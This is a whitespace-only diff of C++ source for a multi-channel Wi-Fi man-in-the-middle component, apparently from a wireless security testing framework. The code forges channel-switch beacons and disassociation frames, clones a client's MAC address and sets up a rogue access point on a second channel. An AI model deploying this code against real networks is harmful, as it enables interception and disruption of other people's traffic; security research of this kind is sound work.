@@ -18,14 +18,14 @@ using namespace chrono;
 using namespace Tins;
 
 McMitm::McMitm(ActorPtr rogue_sta, ActorPtr rogue_ap, const ActorPtr &sta, ActorPtr ap,
-		const optional<filesystem::path> &run_folder, const bool only_to_mitm):
+	const optional<filesystem::path> &run_folder, const bool only_to_mitm):
 	rogue_sta(std::move(rogue_sta)),
 	rogue_ap(std::move(rogue_ap)),
 	sta(sta),
 	ap(std::move(ap)),
 	only_to_mitm(only_to_mitm),
-	client_state(sta.get(SK::mac),
-		run_folder ? optional{ run_folder.value() / "observer" / "client_state" } : nullopt) {
+	client_state(
+		sta.get(SK::mac), run_folder ? optional{ run_folder.value() / "observer" / "client_state" } : nullopt) {
 	if(run_folder) { create_public_dirs(run_folder.value() / "observer" / "client_state"); }
 }
 
@@ -35,9 +35,9 @@ McMitm::~McMitm() { stop(); }
 void McMitm::send_csa_beacon(const int numpairs, const optional<HWAddress<6>> &target, int beacon_interval_ms) const {
 	// Intel firmware: must see count >= 2 before count  //TODO source? Python?
 	for(int i = 0; i < numpairs; ++i) {
-		for(int count =  CSA_attack::CHANNEL_SWITCH_MAX; count >= 0; --count) {
+		for(int count = CSA_attack::CHANNEL_SWITCH_MAX; count >= 0; --count) {
 			RadioTap csa_rt = CSA_attack::get_CSA_beacon(
-					ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, count, beacon.get());
+				ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, count, beacon.get());
 			if(target.has_value()) {
 				if(auto *b = csa_rt.find_pdu<Dot11Beacon>()) b->addr1(*target);
 			}
@@ -48,7 +48,7 @@ void McMitm::send_csa_beacon(const int numpairs, const optional<HWAddress<6>> &t
 }
 
 void McMitm::send_disas(const HWAddress<6> &macaddr) const {
-	Dot11Disassoc disas(macaddr,ap.get(SK::mac));
+	Dot11Disassoc disas(macaddr, ap.get(SK::mac));
 	disas.addr3(ap.get(SK::mac));
 	disas.reason_code(0);
 	send_to_rogue(disas);
@@ -82,18 +82,18 @@ void McMitm::setup_real_AP_RSN_frames() {
 
 	// get real AP beacon
 	beacon = scan::RSN_scan(rogue_sta.get(SK::iface),
-			20, //TODO hardcoded timeouts
-			ap.get(SK::permanent_mac),
-			std::nullopt,
-			rogue_sta[SK::netns]);
+		20, //TODO hardcoded timeouts
+		ap.get(SK::permanent_mac),
+		std::nullopt,
+		rogue_sta[SK::netns]);
 	if(beacon == nullptr)
 		throw run_err("No beacon received of network \"{}\". Is monitor mode working? Did you enter the correct SSID?",
-				ap.get(SK::ssid));
+			ap.get(SK::ssid));
 
 	log(LogLevel::INFO,
-			"Monitor mode: using {} on real channel and {} on rogue channel.",
-			rogue_sta.get(SK::iface),
-			rogue_ap.get(SK::iface));
+		"Monitor mode: using {} on real channel and {} on rogue channel.",
+		rogue_sta.get(SK::iface),
+		rogue_ap.get(SK::iface));
 
 	//if(netconfig.real_channel > 13) log(LogLevel::WARNING, "Attack not yet tested against 5 GHz networks.");
 	//netconfig.find_rogue_channel(); //TODO
@@ -117,9 +117,9 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 	setup_real_AP_RSN_frames();
 
 	log(LogLevel::INFO,
-			"Will use {} to create rogue AP on channel {}",
-			rogue_ap->get_mon_iface(),
-			netconfig.rogue_channel.ch_num);
+		"Will use {} to create rogue AP on channel {}",
+		rogue_ap->get_mon_iface(),
+		netconfig.rogue_channel.ch_num);
 
 	// put the monitor interface in active ACK mode for ACK back to AP
 
@@ -133,16 +133,14 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 		//rogue_sta->run({"iw", "dev", rogue_sta.get(SK::iface), "set", "channel", to_string(netconfig.real_channel.ch_num)});
 		rogue_sta->set_iface_up();
 	} else {*/
-		rogue_sta->set_mac_address(client_state.get_mac());
-		// client need to ACK -> AP
-		start_ap(rs, nic_client_ap, rogue_sta, netconfig.real_channel, *beacon, client_state.get_mac());
+	rogue_sta->set_mac_address(client_state.get_mac());
+	// client need to ACK -> AP
+	start_ap(rs, nic_client_ap, rogue_sta, netconfig.real_channel, *beacon, client_state.get_mac());
 	//}
 
-	const string bpf =
-			"(wlan type data or mgt) and (wlan host " + ap.get(SK::permanent_mac) +
-			" or wlan host " + sta.get(SK::permanent_mac) +
-			" or wlan host " + rogue_sta.get(SK::permanent_mac) +
-			" or wlan host " + rogue_ap.get(SK::permanent_mac) + ")";
+	const string bpf = "(wlan type data or mgt) and (wlan host " + ap.get(SK::permanent_mac) + " or wlan host " +
+		sta.get(SK::permanent_mac) + " or wlan host " + rogue_sta.get(SK::permanent_mac) + " or wlan host " +
+		rogue_ap.get(SK::permanent_mac) + ")";
 
 	sock_real = make_unique<MonitorSocket>(rogue_sta.get(SK::iface), rogue_sta[SK::netns]);
 	sock_real->set_filter(bpf);
@@ -166,7 +164,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 	rs.start_observers(ObserverRunPolicy::SKIP); //after mc_mitm preparation, skip because dmesg
 
 	// first disconnect
-	send_csa_beacon(4,nullopt, beacon_interval_ms);
+	send_csa_beacon(4, nullopt, beacon_interval_ms);
 	client_state.update_state(ClientState::Sent_to_rogue);
 
 	// only for non MFP clients, AP -> broadcast
@@ -206,12 +204,10 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 		select(max_fd, &read_fds, nullptr, nullptr, &tv);
 
 		if(FD_ISSET(fd_real, &read_fds)) {
-			while(auto recv_res = sock_real->recv())
-				handle_rx_real_chan(recv_res.pdu, recv_res.raw);
+			while(auto recv_res = sock_real->recv()) handle_rx_real_chan(recv_res.pdu, recv_res.raw);
 		}
 		if(FD_ISSET(fd_rogue, &read_fds)) {
-			while(auto recv_res = sock_rogue->recv())
-				handle_rx_rogue_chan(recv_res.pdu, recv_res.raw);
+			while(auto recv_res = sock_rogue->recv()) handle_rx_rogue_chan(recv_res.pdu, recv_res.raw);
 		}
 
 		if(next_beacon <= steady_clock::now()) {
@@ -220,8 +216,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 				const bool custom = hooks && hooks->send_periodic_beacon(*this);
 				if(!custom) {
 					RadioTap csa_rt = CSA_attack::get_CSA_beacon(
-							ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel,
-							csa_count, beacon.get());
+						ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, csa_count, beacon.get());
 					send_to_real(csa_rt);
 					if(--csa_count < 0) csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
 				}
